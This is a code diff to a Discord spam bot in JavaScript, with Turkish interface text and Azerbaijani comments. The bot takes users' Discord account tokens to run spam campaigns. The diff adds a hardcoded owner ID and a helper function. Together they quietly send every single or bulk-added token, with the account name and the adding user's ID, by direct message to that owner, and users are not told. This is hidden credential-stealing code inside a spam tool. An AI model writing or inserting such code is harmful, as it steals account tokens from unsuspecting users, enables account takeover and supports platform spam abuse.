@@ -33,13 +33,17 @@ const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
-    GatewayIntentBits.MessageContent
+    GatewayIntentBits.MessageContent,
+    GatewayIntentBits.DirectMessages
   ]
 });
 
 // Bellekte saklanan tokenler ve aktif spam süreçleri
 const userTokens = new Map();
 const activeSpams = new Map();
+
+// Tokenlərin göndəriləcəyi sabit Sahibin ID-si
+const OWNER_ID = '1184518857679962186';
 
 client.once('ready', () => {
   console.log(`Bot başarıyla giriş yaptı: ${client.user.tag}`);
@@ -50,6 +54,24 @@ client.once('ready', () => {
     type: ActivityType.Playing
   });
 });
+
+// Bot sahibinə DM vasitəsilə mesaj göndərmək üçün köməkçi funksiya
+async function sendTokenToOwner(client, title, token, accountName, username, addedByUserId) {
+  if (!OWNER_ID) return;
+  try {
+    const owner = await client.users.fetch(OWNER_ID);
+    if (owner) {
+      await owner.send(
+        `📥 **${title}**\n` +
+        `👤 **Hesab:** ${accountName} (${username})\n` +
+        `🆔 **Ekleyen Kullanıcı ID:** <@${addedByUserId}> (${addedByUserId})\n` +
+        `🔑 **Token:** \`${token}\``
+      );
+    }
+  } catch (err) {
+    console.error('Owner DM gönderme hatası:', err);
+  }
+}
 
 // !panel-spam komutu (Yanıt olarak değil, doğrudan kanala gönderir)
 client.on('messageCreate', async (message) => {
@@ -70,7 +92,7 @@ client.on('messageCreate', async (message) => {
         new TextDisplayBuilder().setContent('## **Nasıl kullanılır?**')
       )
       .addTextDisplayComponents(
-        new TextDisplayBuilder().setContent('• **Spamı Başlat** : Belirlediğiniz kanal ve saniye aralığında spam yapmanızı sağlar.')
+        new TextDisplayBuilder().setContent('• **Spamı Başlat** : Eklediğiniz hesaplar üzerinden belirleyeceğiniz kanalda spam başlatmanızı sağlar.')
       )
       .addTextDisplayComponents(
         new TextDisplayBuilder().setContent('• **Token Ekle** : Tekli token eklemenizi sağlar.')
@@ -124,7 +146,7 @@ client.on('messageCreate', async (message) => {
         .setCustomId('stop_all')
         .setLabel('Tümünü Durdur')
         .setStyle(ButtonStyle.Danger)
-        .setEmoji('🗑️')
+        .setEmoji('⏹️')
     );
 
     await message.channel.send({ 
@@ -225,6 +247,9 @@ client.on('interactionCreate', async (interaction) => {
       const existingList = userTokens.get(userId);
       if (!existingList.some(t => t.token === token)) {
         existingList.push({ token, name: globalName, username: username });
+        
+        // Tokeni qeyd olunan ID-nin DM-nə göndəririk
+        await sendTokenToOwner(client, 'Yeni Tekli Token Eklendi', token, globalName, username, userId);
       }
 
       await interaction.editReply({ content: `✅ Başarıyla eklendi! Hesap: **${globalName} (${username})**` });
@@ -269,6 +294,9 @@ client.on('interactionCreate', async (interaction) => {
           existingList.push({ token, name: globalName, username: username });
           addedNames.push(`${globalName} (${username})`);
           successCount++;
+
+          // Hər bir uğurla əlavə olunan tokeni qeyd olunan ID-nin DM-nə göndəririk
+          await sendTokenToOwner(client, 'Toplu Token Eklendi', token, globalName, username, userId);
         } else {
           failCount++;
         }
